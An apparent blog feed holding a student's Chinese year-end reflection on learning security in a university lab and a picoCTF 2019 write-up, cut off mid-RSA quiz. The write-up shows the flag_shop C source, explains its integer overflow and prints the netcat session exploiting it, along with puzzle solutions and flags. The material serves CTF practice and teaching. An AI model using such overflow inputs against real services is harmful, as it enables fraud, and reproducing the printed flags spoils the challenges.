        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;XCTF攻防世界刷题(WEB部分)(新手区).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019 wp</title>
    <link href="https://www.damyahome.github.io/NCTF2019-wp/"/>
    <id>https://www.damyahome.github.io/NCTF2019-wp/</id>
    <published>2020-01-02T11:17:31.000Z</published>
    <updated>2020-01-03T13:22:18.397Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="NCTF2019_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;NCTF2019_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2019年终总结</title>
    <link href="https://www.damyahome.github.io/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-02T10:47:44.000Z</published>
    <updated>2020-01-02T13:29:48.818Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Damya-2019年终总结"><a href="#Damya-2019年终总结" class="headerlink" title="Damya 2019年终总结"></a>Damya 2019年终总结</h1><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019年是我大一下和大二上的阶段学习时间，这一年对于我而言有打击也有改变。</p><p>大一下发生了很多事，一起在实验室里学习的同级伙伴，我看着他们三三两两地自愿退出了实验室，心底的理由大多是“实验室活太多耽误自己的学习”，又在某人的诱导下，产生了“在哪学不是学，没必要呆在实验室里”的想法。在他们走后也来了些新的伙伴，他们也学得很认真，但也和我一样，没通过学长布置的学期末的考核，丧失了学习信心，过早离开了实验室。我记得那天，学长们发了很大的脾气，我们都将离开这个已经有些依赖感的地方，有些是真的离开，有些是像我这样死皮赖脸想继续学习。仅存的是和我一起的男朋友，他给学长们带来过很大的麻烦，同时我们的办公室恋情也影响了各自的学习，在大二上时他也退出了实验室，我对学长这一年的照顾感到很抱歉。人各有志，我理解他们的想法，但我没法像他们一样，在我敲前端代码时，我的心里也一直在催促我要搞安全，因为喜欢搞安全我才能坚持下去，学习到东西，帮上学长的忙。</p><p>我在大一阶段只是一个辣鸡前端手，我写代码很慢，悟性也不是很高，只会改改模板的水平，老队长在我第一次经验分享时就质疑过我的水平，质疑我是不是有人帮才进的实验室，我当时非常的害怕，自闭学习了好一阵子，因为我的实力严重跟不上大部队，于是就放养了，也许那个时候的学长心里也认为我会退实验室吧。我在大一上时什么比赛的ctf题都做不了，在大一下时，我看了卓哥出去宣讲，我才知道其实是有刷题平台的。于是我就开始刷题，从misc开始，crypto，web，我能做的都尽量去做，不会做的就看wp，记录下做题过程，我的markdown是男朋友强制我去学的，然后为了写mdwriteup，我搭了hexo。在我磕磕绊绊搭好后发的第一篇文章是3月26日，之后每个月都至少会发表一些文章用来记录我的学习过程，有学习经验、遇到的坑、刷题wp等。从大一下开始，我打比赛时可以做一些misc题了。但是这个阶段只懂套路不懂原理，所以光刷题并没有多大用，在期末考核时也有种使不上力的无力感。</p><p>我刚进实验室时就很崇拜涛哥，现在依旧很崇拜，他帮助了我很多很多，也给了我很多启发，在写脚本和思维上，他疏导了我很多的僵化思想。然后是卓哥，他很懂得教人，也很体谅我身体差，也很包容我，我经常会去视奸他博客学习。万学长我接触的不多，觉得人很可爱，在去合肥那次才感受到他的强大，站一日一个准。因为被崔学长骂过，有点怕他，只敢视奸他博客。对郭哲学长的印象就是什么题他都能做出来，非常稳。周哥和吴师傅人也特别好，都不怎么骂人，浩哥虽然经常神龙见首不见尾，但是人也非常好，学长们的技术都特别强，有很多需要学习的地方和经验。</p><p>大二上期间，因为断层了，我意外获得了一些能出去比赛的经验，但我实际上上场打过的只有实验室队内赛、第一届应急响应杯、一个人的国赛、今年的实验室队内赛共四场AWD，我的经验依旧不够用。大二上我开始自己学web和渗透了，也逐渐会写一些小脚本，别人的脚本也会改会用，也学了一些网站框架，我想学我自己喜欢的知识，并巩固原理，所以放慢了刷题速度并提高质量和类型。大二上时期，来了新队友和大一的学弟学妹，感觉实验室又热闹起来了，挺好的，最重要的是终于不是我在孤身奋战了，有人分担压力的感觉真的很好。但我依旧学的很慢，直到现在还有点难跟上卓哥大二时的水平，我希望新的一年不奢求能成为队友的后背，先能够成为队友的臂膀吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Damya-2019年终总结&quot;&gt;&lt;a href=&quot;#Damya-2019年终总结&quot; class=&quot;headerlink&quot; title=&quot;Damya 2019年终总结&quot;&gt;&lt;/a&gt;Damya 2019年终总结&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
      <category term="日常" scheme="https://www.damyahome.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="年终总结" scheme="https://www.damyahome.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2019picoCTF补充wp(10050分记录)</title>
    <link href="https://www.damyahome.github.io/2019picoCTF%E8%A1%A5%E5%85%85wp-10050%E5%88%86%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.damyahome.github.io/2019picoCTF%E8%A1%A5%E5%85%85wp-10050%E5%88%86%E8%AE%B0%E5%BD%95/</id>
    <published>2019-12-04T12:34:49.000Z</published>
    <updated>2019-12-04T13:30:22.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一般技能-General-Skills"><a href="#一般技能-General-Skills" class="headerlink" title="一般技能(General Skills)"></a>一般技能(General Skills)</h1><h2 id="whats-the-difference-Points-200"><a href="#whats-the-difference-Points-200" class="headerlink" title="whats-the-difference - Points: 200"></a>whats-the-difference - Points: 200</h2><blockquote><p>Can you spot the difference? kitters cattos. They are also available at /problems/whats-the-difference_0_00862749a2aeb45993f36cc9cf98a47a on the shell server<br>Hints: How do you find the difference between two files?<br>Dumping the data from a hex editor may make it easier to compare.</p></blockquote><p>这题我完全没有思路,看了github 上ajolliet师傅的wp发现自己学到了很多</p><p>以下是解题过程:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C kitters.jpg &gt; kittersfile</span><br><span class="line">hexdump -C cattos.jpg &gt; cattosfile</span><br><span class="line">diff -c kittersfile cattosfile | grep <span class="string">"^!"</span></span><br></pre></td></tr></table></figure><p>使用diff命令能很快的比较出两个文件的不同,<code>grep &quot;^!&quot;</code>能把不同的行数行在一起进行对比,于是将不同的地方放在一起比较,提取字符就能得到flag(数据太长就不贴出来了)<br>picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</p><h2 id="flag-shop-Points-300"><a href="#flag-shop-Points-300" class="headerlink" title="flag_shop - Points: 300"></a>flag_shop - Points: 300</h2><blockquote><p>There’s a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.<br>Hints: Two’s compliment can do some weird things when numbers get really big!</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the flag exchange\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"We sell flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n1. Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n2. Buy Flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n3. Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Currently for sale\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1. Defintely not the flag Flag\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2. 1337 Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"These knockoff Flags cost 900 each, enter desired quantity\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">900</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nThe final cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds to complete purchase\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"1337 flags cost 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to buy one"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        FILE *f = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">                        <span class="keyword">if</span>(f == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"flag not found: please run this on the server\n"</span>);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">                        fgets(buf, <span class="number">63</span>, f);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS: %s\n"</span>, buf);</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个商店系统实现的功能有进货劣质品和购买真品,但在代码中存在一个漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">account_balance = account_balance - total_cost;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当<code>account_balance - total_cost</code>为负数时,他的值会变成正数赋给<code>account_balance</code>,将会使你的账户余额增加,而购买一件劣质品成本需要900块,所以只要使你的进货成本比售价高,就有足够的钱买1337个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 14937</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">1</span><br><span class="line">These knockoff Flags cost 900 each, enter desired quantity</span><br><span class="line">2147468647</span><br><span class="line">The final cost is: -13500900</span><br><span class="line">Your current balance after transaction: 13502000</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">2</span><br><span class="line">1337 flags cost 100000 dollars, and we only have 1 in stock</span><br><span class="line">Enter 1 to buy one1</span><br><span class="line">YOUR FLAG IS: picoCTF&#123;m0n3y_bag5_e062f0fd&#125;</span><br></pre></td></tr></table></figure></p><p>picoCTF{m0n3y_bag5_e062f0fd}</p><h2 id="mus1c-Points-300"><a href="#mus1c-Points-300" class="headerlink" title="mus1c - Points: 300"></a>mus1c - Points: 300</h2><blockquote><p>I wrote you a song. Put it in the picoCTF{} flag format<br>Hints: Do you think you can master rockstar?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Pico&apos;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&apos;s waitin</span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">My song&apos;s something</span><br><span class="line">put Pico into This</span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line">shout my lyric</span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line">shout my lyric</span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line">build it up</span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure><p>这道题和NCTF的某题很像,可以用这个网址解密 <a href="https://codewithrockstar.com/" target="_blank" rel="noopener">https://codewithrockstar.com/</a><br><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>将ascil码转成文本,得到flag</p><p>picoCTF{rrrocknrn0113r}</p><h2 id="1-wanna-b3-a-r0ck5tar-Points-350"><a href="#1-wanna-b3-a-r0ck5tar-Points-350" class="headerlink" title="1_wanna_b3_a_r0ck5tar - Points: 350"></a>1_wanna_b3_a_r0ck5tar - Points: 350</h2><blockquote><p>I wrote you another song. Put the flag in the picoCTF{} flag format</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string        </span><br><span class="line">Tommy&apos;s been down               </span><br><span class="line">Music is a billboard-burning razzmatazz!</span><br><span class="line">Listen to the music             </span><br><span class="line">If the music is a guitar                  </span><br><span class="line">Say &quot;Keep on rocking!&quot;                </span><br><span class="line">Listen to the rhythm</span><br><span class="line">If the rhythm without Music is nothing</span><br><span class="line">Tommy is rockin guitar</span><br><span class="line">Shout Tommy!                    </span><br><span class="line">Music is amazing sensation </span><br><span class="line">Jamming is awesome presence</span><br><span class="line">Scream Music!                   </span><br><span class="line">Scream Jamming!                 </span><br><span class="line">Tommy is playing rock           </span><br><span class="line">Scream Tommy!       </span><br><span class="line">They are dazzled audiences                  </span><br><span class="line">Shout it!</span><br><span class="line">Rock is electric heaven                     </span><br><span class="line">Scream it!</span><br><span class="line">Tommy is jukebox god            </span><br><span class="line">Say it!                                     </span><br><span class="line">Break it down</span><br><span class="line">Shout &quot;Bring on the rock!&quot;</span><br><span class="line">Else Whisper &quot;That ain&apos;t it, Chief&quot;                 </span><br><span class="line">Break it down</span><br></pre></td></tr></table></figure><p>跟着github看了一通rockstar语言,长见识了,然后决定使用rockstar-py工具,将rock文件转换成python语言(只支持python3运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -W ignore -m rockstarpy lyrics2.rock</span><br></pre></td></tr></table></figure></p><p>转换后的文本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll = <span class="literal">True</span></span><br><span class="line">Silence = <span class="literal">False</span></span><br><span class="line">a_guitar = <span class="number">19</span></span><br><span class="line">Tommy = <span class="number">44</span></span><br><span class="line">Music = <span class="number">160</span></span><br><span class="line">the_music = input()</span><br><span class="line"><span class="keyword">if</span> the_music == a_guitar:</span><br><span class="line">    print(<span class="string">"Keep on rocking!"</span>)</span><br><span class="line">    the_rhythm = input()</span><br><span class="line">    <span class="keyword">if</span> the_rhythm - Music == <span class="literal">False</span>:</span><br><span class="line">        Tommy = <span class="number">66</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        Music = <span class="number">79</span></span><br><span class="line">        Jamming = <span class="number">78</span></span><br><span class="line">        print(Music!)</span><br><span class="line">        print(Jamming!)</span><br><span class="line">        Tommy = <span class="number">74</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        They are dazzled audiences</span><br><span class="line">        print(it!)</span><br><span class="line">        Rock = <span class="number">86</span></span><br><span class="line">        print(it!)</span><br><span class="line">        Tommy = <span class="number">73</span></span><br><span class="line">        print(it!)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"Bring on the rock!"</span>)</span><br><span class="line">        Else print(<span class="string">"That ain't it, Chief"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>再将ascil码转换成字符<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = [<span class="number">66</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">74</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">73</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;&#123;&#123;&#125;&#125;&#125;'</span>.format(<span class="string">''</span>.join(map(chr, r)))</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{BONJOVI}</p><h1 id="密码学-Cryptography"><a href="#密码学-Cryptography" class="headerlink" title="密码学(Cryptography)"></a>密码学(Cryptography)</h1><h2 id="Mr-Worldwide-Points-200"><a href="#Mr-Worldwide-Points-200" class="headerlink" title="Mr-Worldwide - Points: 200"></a>Mr-Worldwide - Points: 200</h2><blockquote><p>A musician left us a message. What’s it mean?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)&#125;</span><br></pre></td></tr></table></figure><p>将坐标点对应google地图,得到一串城市坐标<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;</span><br><span class="line">2QH3+86 Kyoto, Japan</span><br><span class="line">FP9R+Q9 Odesa, Odessa Oblast, Ukraine</span><br><span class="line">QR55+H9 Dayton, Ohio, USA</span><br><span class="line">2X8H+3R Istanbul(Eminönü, Rüstem Paşa, Fatih/İstanbul, Turkey)</span><br><span class="line">F988+MM Abu Dhabi - United Arab Emirates</span><br><span class="line">4MRV+87 Kuala Lumpur, Federal Territory of Kuala Lumpur, Malaysia</span><br><span class="line">_</span><br><span class="line">2Q47+5C Addis Ababa, Ethiopia</span><br><span class="line">2Q6W+9H Loja, Ecuador</span><br><span class="line">9VHW+5R Amsterdam, Netherlands</span><br><span class="line">34PR+7J Sleepy Hollow, New York, USA</span><br><span class="line">QHRV+24 Kodiak, Alaska, USA</span><br><span class="line">6W4F+8R Alexandria, Egypt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>提取每个城市名的首位字母,得到flag<br>picoCTF{KODIAK_ALASKA}</p><h2 id="rsa-pop-quiz-Points-200"><a href="#rsa-pop-quiz-Points-200" class="headerlink" title="rsa-pop-quiz - Points: 200"></a>rsa-pop-quiz - Points: 200</h2><blockquote><p>Class, take your seats! It’s PRIME-time for a quiz… nc 2019shell1.picoctf.com 61751<br>RSA <a href="https://simple.wikipedia.org/wiki/RSA_algorithm" target="_blank" rel="noopener">info</a></p></blockquote><p>nc过去后会出很多道关于rsa的题目</p><p>第一题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME 